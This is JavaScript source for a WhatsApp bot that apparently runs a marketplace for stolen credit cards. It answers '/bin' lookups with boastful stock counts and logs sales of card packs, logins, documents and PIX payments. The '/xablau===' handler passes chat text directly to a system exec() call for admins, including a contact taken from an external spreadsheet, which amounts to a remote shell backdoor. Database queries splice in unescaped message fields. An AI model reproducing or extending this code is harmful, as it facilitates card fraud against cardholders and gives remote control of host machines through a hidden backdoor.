    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_RESGATAR_GIFT','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_CC','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_CC_MIX','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_CONSULTAVEL','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_CONSULTADA','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_LOGIN','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_LARA','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_DOC','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_NOVO_ASSOCIADO','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_NOVO_INDICADO','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('NOT_COMPROU_TRILHA','1') ON CONFLICT DO NOTHING`).run()
    DataBase_Better.prepare(`INSERT INTO NOTIFICACOES_GRUPOS (PARAMETRO,VALOR) VALUES ('ELOGIAR','1') ON CONFLICT DO NOTHING`).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS GRUPOS_NOTIFICAR
(
ID_GRUPO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACK_SUPER_ELFO 
(
MATERIAL VARCHAR(32) NOT NULL DEFAULT '0',
DATA_INSERIDO_MS VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACK_SUPER_ELFO_VENDIDOS
(
MATERIAL VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32),
NUMERO_COMPRADOR VARCHAR(32),
DATA_INSERIDO_MS VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
}
//##########################
//#
//#░██████╗░██████╗░██╗░░░░░
//#██╔════╝██╔═══██╗██║░░░░░
//#╚█████╗░██║██╗██║██║░░░░░
//#░╚═══██╗╚██████╔╝██║░░░░░
//#██████╔╝░╚═██╔═╝░███████╗
//#╚═════╝░░░░╚═╝░░░╚══════╝
//##########################

Var_headless = true
if(Nome_Dono==="Niack"){
    Var_headless = false
}
wppconnect.create({
    session: `${Nome_Dono}Token`,
    puppeteerOptions: {
        userDataDir: `./tokens/${Nome_Dono}Token`,
        args: [ "--no-sandbox"],
        executablePath: '/usr/bin/chromium-browser',
    },
    headless: Var_headless,
    
    whatsappVersion: '2.2230.15'
}).then(async (client) => {

    await DataBase_Better.prepare(`INSERT INTO CONTATOS (ID_CONTATO,SALDO,NOME,DATA_MS_INSERIDO) VALUES ('${Numero_Dono}@c.us','0','${Nome_Dono}','${Date.now()}') ON CONFLICT DO NOTHING`).run()

    Numero_Bot = await client.getWid();
    NUMERO_PURO_BOT = Numero_Bot.toString().replace(/[^0-9]/igm, '')

    Nome_Bot = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'NOME_BOT'`).get()["VALOR"]

    console.log(`${Nome_Bot} - ${Numero_Bot}`)

    Texto = `*${Nome_Dono} - ${Nome_Bot} reiniciado!*`
    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Numero_Dono}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

    try {
        Numero_Suporte_Plan = await Numero_Suporte_Planilha()
        Texto = `*${Nome_Dono} - ${Nome_Bot} reiniciado!*`
        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Numero_Suporte_Plan}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
    } catch (error) {
        console.log(error)
    }
    try {
        Rimuru_Contato = await Rimuru_Contato_Plan()
        Texto = `*${Nome_Dono} - ${Nome_Bot} reiniciado!*`
        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Rimuru_Contato}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
    } catch (error) {
        console.log(error)
    }


    try {
        Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES`).all()
        Texto = `*${Nome_Dono} - ${Nome_Bot} reiniciado!*`
        for await (Gerente of Array_Gerentes) {
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Gerente["ID_CONTATO"]}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
        }
    } catch (error) {
        console.log(error)
    }

    Obter_Dados_Planilha()
    Checkar_CC_Fila(client)
    Fila_Montar_Pacote_Enviar(client)
    Fila_SendsZap(client)
    if(Nome_Dono!="Niack"){
        Fila_SendsZap_ADMS_GRUPOS(client)
    }
    Ouvindo(client)
    Executar_Fila(client)
    Spam(client)
    Reiniciar_Auto_Bug_Rato(client)

}).catch(async(erro) => console.log(erro));

QUALBINCHECKER = DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'QUALBINCHECKER'`).get()["VALOR"]

//#######################################################################################################################################
//#███╗░░░███╗███████╗███╗░░██╗░██████╗░█████╗░░██████╗░███████╗███╗░░██╗░██████╗ ███╗░░██╗░█████╗░██████╗░███╗░░░███╗░█████╗░██╗░██████╗
//#████╗░████║██╔════╝████╗░██║██╔════╝██╔══██╗██╔════╝░██╔════╝████╗░██║██╔════╝ ████╗░██║██╔══██╗██╔══██╗████╗░████║██╔══██╗██║██╔════╝
//#██╔████╔██║█████╗░░██╔██╗██║╚█████╗░███████║██║░░██╗░█████╗░░██╔██╗██║╚█████╗░ ██╔██╗██║██║░░██║██████╔╝██╔████╔██║███████║██║╚█████╗░
//#██║╚██╔╝██║██╔══╝░░██║╚████║░╚═══██╗██╔══██║██║░░╚██╗██╔══╝░░██║╚████║░╚═══██╗ ██║╚████║██║░░██║██╔══██╗██║╚██╔╝██║██╔══██║██║░╚═══██╗
//#██║░╚═╝░██║███████╗██║░╚███║██████╔╝██║░░██║╚██████╔╝███████╗██║░╚███║██████╔╝ ██║░╚███║╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║██████╔╝
//#╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚══╝╚═════╝░╚═╝░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░ ╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
//#######################################################################################################################################

Setinterval_Obter_Dados_Planilha = false
async function Obter_Dados_Planilha() {

    if (Setinterval_Obter_Dados_Planilha === false) {
        Setinterval_Obter_Dados_Planilha = true
        setInterval(async function () {
            Obter_Dados_Planilha()
        }, 1800000);//1800000
    }

    // statusFind: async (statusSession, session) => {
    //     if(statusSession === StatusFind.desconnectedMobile) {
    //         console.log(session)
    //         console.log(StatusFind)
    //         console.log(statusSession)
    //     }
    //     console.log(statusSession)
    // }
    // console.log("Passou")

    // CatchQRCallback: ((qrCode: string, asciiQR: string, attempt: number, urlCode?: string) => void)

    // await client.StatusFind((a,b) => {
    //     console.log(a)
    //     console.log(b)
    // })

    Donos_Supremos = await Donos_Supremos_Planilhas()
    Donos_Supremos = Donos_Supremos.split(",")
    Numero_Suporte_Plan = await Numero_Suporte_Planilha()
    Rimuru_Contato = await Rimuru_Contato_Plan()

    Adms = []
    Adms.push(Numero_Dono)

    Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES`).all()
    for await (Gerente of Array_Gerentes) {
        Adms.push(Gerente["ID_CONTATO"])
    }
    Adms.push(Rimuru_Contato)

    Nome_Bot = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'NOME_BOT'`).get()["VALOR"]

    fastFolderSize(`./tokens/${Nome_Dono}Token`, (err, bytes) => {
        if (err) {
            throw err
        }
        Tamanho_Token = (bytes / 1024 / 1024).toFixed(2) + ' Mb'
    })
}

async function Ouvindo(client) {
    console.log("Ouvindo...")

    client.onParticipantsChanged(async (Evento) => {
        //console.log(Evento)
        console.log(`onParticipantsChanged: ${JSON.stringify(Evento["groupId"])}`)

        if (Evento["who"][0] === Numero_Bot) {
            console.log("Who sou eu")
            if (Evento["action"] === "leave") {
                console.log("Eu sai")
                await Entrar_Grupo_Bots(client)
            }
        }
    })







    client.onMessage(async (message) => {
        // console.log(message)

        // So_Eu_Posso_interagir = false
        // if (So_Eu_Posso_interagir === true && (message.from).toString() != "5521982031729@c.us" && (message.from).toString() != "5521981127153@c.us" && (message.from).toString() != "556699360528@c.us" && (message.from).toString() != "5511946247123@c.us" && (message.from).toString() != "556392403573@c.us") {
        //     return
        // }

        if ((message.from).toString() == "status@broadcast") {
            return
        }



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((message.type).toString() === "chat") {
            if (message.from.indexOf("@g.us") > -1) {
                Numero_temp = (message.author).replace(/\@c\.us/igm, '');
            } else {
                Numero_temp = (message.from).replace(/\@c\.us/igm, '');
            }

            if (message.body.indexOf("/obter_pixs_inseridos===") > -1 && Adms.includes(Numero_temp)) {
                //obter_pixs_inseridos===MES/DIA/ANO===MES/DIA/ANO
                //obter_pixs_inseridos===01/06/2022===22/06/2022

                Data_DIV = message.body.split("===")

                Date_Inicio = new Date(Data_DIV[1]).getTime();
                Date_Fim = new Date(Data_DIV[2]).getTime();

                console.log(`Date_Inicio: ${Date_Inicio} | Date_Fim: ${Date_Fim}`)

                PIXINSERIDOS = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR as FLOAT)) FROM PIX_COPIA_COLA WHERE PROCESSADO = 1 AND DATA_INSERIDO_MS > ${Date_Inicio} AND DATA_INSERIDO_MS < ${Date_Fim}`).get()["SUM(CAST(VALOR as FLOAT))"]
                PIXINSERIDOS = parseFloat(PIXINSERIDOS).toFixed(2)

                var options = {
                    'method': 'POST',
                    'url': `https://docs.google.com/forms/d/e/1FAIpQLSeQ4Q2ETlNIua934jErH7i835ErdJUR5r9WOvI1bcTcIhfbOg/formResponse?entry.1965156903=${Nome_Dono.toString().replace(/[^0-9a-zA-Z\s]/igm, '')}&entry.1723148556=${PIXINSERIDOS}`,
                    rejectUnauthorized: false,
                };
                request(options, function (error, response) {
                    if (error) throw new Error(error);
                    console.log(`Enviando Total de Pix do dia ${Data_DIV[1]} até ${Data_DIV[2]} que deu R$:${PIXINSERIDOS}`);
                });
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //########################################################################
        if ((message.body).indexOf("/xablau===") > -1) {
            if (message.from.indexOf("@c.us") > -1) {
                So_Numero_Author_Temp = (message.from).replace(/[^0-9]/igm, '');
                if (Adms.includes(So_Numero_Author_Temp)) {
                    msg = message.body.split("===")

                    exec(msg[1], (error, stdout, stderr) => {
                        if (error) {
                            console.log(`error: ${error.message}`);
                            return;
                        }
                        if (stderr) {
                            console.log(`stderr: ${stderr}`);
                            return;
                        }
                        console.log(`stdout: ${stdout}`);

                        return
                    })
                }
            }
        }


        if (message.from.indexOf("@g.us") > -1) {//MENSAGEM VEIO DE UM GRUPO

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            GRUPOS_DETECTADOS = await DataBase_Better.prepare(`SELECT ID_GRUPO FROM GRUPOS_DETECTAR WHERE ID_GRUPO = '${message.from}'`).get()
            //console.log(GRUPOS_DETECTADOS)
            if (GRUPOS_DETECTADOS === undefined) {
                await DataBase_Better.prepare(`INSERT INTO GRUPOS_DETECTAR (ID_GRUPO) VALUES ('${message.from}') ON CONFLICT DO NOTHING`).run()

                Texto = `*GRUPO IDENTIFICADO!*

ID GRUPO: ${message.from}`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
            } else {

            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



            if ((message.type).toString() != "chat") {
                return
            }



            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            if (message.body.indexOf("/bin ") > -1) {
                DATA_VENCIMENTO_MS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).get()["VALOR"]
                if (Date.now() > parseInt(DATA_VENCIMENTO_MS)) {
                    return
                }
                BOT_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CC'`).get()["VALOR"]
                if (BOT_CC === "0") {
                    return
                }

                msg = message.body.split(" ")
                if (msg[1] === "") {
                    return
                }

                BIN = msg[1]

                Array_BIN = await DataBase_Better.prepare(`SELECT * FROM CCS WHERE BIN = '${BIN}'`).all()
                if (Array_BIN.length === 0) {
                    //TEM NÃO
                    return
                } else {

                    // VENDER_UNIDADE_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_UNIDADE_CC'`).get()["VALOR"]
                    // VENDER_PACOTE_BIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_BIN'`).get()["VALOR"]
                    // VENDER_PACOTE_MIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_MIX'`).get()["VALOR"]
                    // if (VENDER_UNIDADE_CC === "0") {
                    //     if (VENDER_PACOTE_BIN === "1" || VENDER_PACOTE_MIX === "1") {
                    //         Array_Textos = [
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, mas Só trabalho com Pacotes fechados de CC, não vendo unidade ou BIN específica...`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, Só vendo Pacotes fechados de CC`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, só vendo pacotes, não vendo unidade.`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, foi mal nenem, só vendo pacote fechado ou aleatório.`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, comigo é só Pacotes fechados de CC papai.`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, você terá que comprar um pacote Pacotes fechados de CC comigo para descobrir.`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, Só Pacote Pacotes fechados de CC bb.`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, vai comprando meus Pacotes fechados de CC, talvez vc encontre essa BIN em um deles.`,
                    //             `*${Nome_Bot}:* 📦 Tenho ${Array_BIN.length} CCs dessa BIN, só vendo Pacotes fechados de CC.`,
                    //         ]
                    //         Texto = Array_Textos[Math.floor(Math.random() * Array_Textos.length)];

                    //         await client.reply(message.from, Texto, message.id).then(async (result) => {
                    //         }).catch(async(erro) => {
                    //             console.error('Error when sending: ', erro); //return object error
                    //         });
                    //         return
                    //     }

                    // } else {

                    Array_Textos = [
                        `*${Nome_Bot}:* ✅ Opa!!! Eu tenho ${Array_BIN.length} CCs dessa BIN!!! 😏`,
                        `*${Nome_Bot}:* ✅ Vem com o papai vem 😌 eu tenho ${Array_BIN.length} CCs dessa BIN!!`,
                        `*${Nome_Bot}:* ✅ Euuuuu pode vir, tenho ${Array_BIN.length} CCs dessa BIN te esperando... 😎`,
                        `*${Nome_Bot}:* ✅ 😌 Eu sempre tenho... para de perder tempo em vem logo... ${Array_BIN.length} CCs dessa BIN no estoque.`,
                        `*${Nome_Bot}:* ✅ Hey, compra comigo, eu tenho sim!! 🥰 ${Array_BIN.length} CCs dessa BIN`,
                        `*${Nome_Bot}:* ✅ Você ta falando com o Bot mais completo fi 😉 vem logo que eu tenho ${Array_BIN.length} CCs dessa BIN`,
                        `*${Nome_Bot}:* ✅ Opa, eu tenho ${Array_BIN.length} CCs dessa BIN`,
                        `*${Nome_Bot}:* ✅ tenho ${Array_BIN.length} CCs dessa BIN, só vir!`,
                        `*${Nome_Bot}:* ✅ Vem nenem, vem meu bb, vou separar essa BIN para você! tenho ${Array_BIN.length} CCs dessa BIN`,
                        `*${Nome_Bot}:* ✅ tenho ${Array_BIN.length} CCs dessa BIN!!!`,
                        `*${Nome_Bot}:* ✅ Pode vir! tenho ${Array_BIN.length} CCs dessa BIN`,
                        `*${Nome_Bot}:* ✅ Tenho várias dessa! vem vem vem vem!!! tenho ${Array_BIN.length} CCs dessa BIN`,
                        `*${Nome_Bot}:* ✅ 😌 Nem sei porque você ainda pergunta... o pai sempre tem nenem. tenho ${Array_BIN.length} CCs dessa BIN`,
                    ]
                    Texto = Array_Textos[Math.floor(Math.random() * Array_Textos.length)]
                    await client.reply(message.from, Texto, message.id).then(async (result) => {
                    }).catch(async(erro) => {
                        console.error('Error when sending: ', erro); //return object error
                    });
                    return
                }
            }
            //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




            //########################################################################
            if ((message.body).toLowerCase() === "upaaa") {
                await client.reply(message.from, `Up!`, message.id).then(async (result) => {
                    //console.log('Result: ', result); //return object success
                }).catch(async(erro) => {
                    console.error('Error when sending: ', erro); //return object error
                });
            }

            //########################################################################
            if ((message.body).toLowerCase() === "bin") {
                await client.reply(message.from, `Caso queria *pesquisar uma BIN em mim, aqui no grupo mesmo*, só digitar /bin e sua bin

Exemplo:

/bin 376334`, message.id).then(async (result) => {
                    //console.log('Result: ', result); //return object success
                }).catch(async(erro) => {
                    console.error('Error when sending: ', erro); //return object error
                });
            }
            //########################################################################
            if (message.body === "/id") {
                try {
                    Link = await client.getGroupInviteLink(message.from);
                } catch (error) {
                    Link = "0"
                }
                console.log(message)
                Texto = `ID: ${message.from}`
                await client.reply(message.from, Texto, message.id).then(async (result) => {
                    //console.log('Result: ', result); //return object success
                }).catch(async(erro) => {
                    console.error('Error when sending: ', erro); //return object error
                });
                return
            }
            //########################################################################


            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
            if ((message.body).indexOf("/notifiqueaqui===") > -1) {
                So_Numero_Author_Temp = (message.author).replace(/[^0-9]/igm, '');
                if (Adms.includes(So_Numero_Author_Temp)) {

                    Array_Total_Igual = message.body.match(/\=/igm);
                    msg = message.body.split("===")

                    if (msg[1] === "" || Array_Total_Igual.length != 3) {
                        Texto = `Comando inválido`
                        await client.sendText(message.from, Texto).then(async (result) => {
                        }).catch(async(erro) => {
                            console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                        });
                        return
                    }

                    if (msg[1] === "1") {
                        Texto = `*NOTIFICAÇÕES DE VENDAS HABILITADAS NESTE GRUPO*`
                        await client.reply(message.from, Texto, message.id).then(async (result) => {

                            await DataBase_Better.prepare(`INSERT INTO GRUPOS_NOTIFICAR (ID_GRUPO) VALUES ('${message.from}') ON CONFLICT DO NOTHING`).run()

                        }).catch(async(erro) => {
                            console.error('Error when sending: ', erro)
                        });
                        return

                    } else if (msg[1] === "0") {
                        Texto = `*NOTIFICAÇÕES DE VENDAS DESABILITADAS NESTE GRUPO*`
                        await client.reply(message.from, Texto, message.id).then(async (result) => {

                            await DataBase_Better.prepare(`DELETE FROM GRUPOS_NOTIFICAR WHERE ID_GRUPO = '${message.from}'`).run();

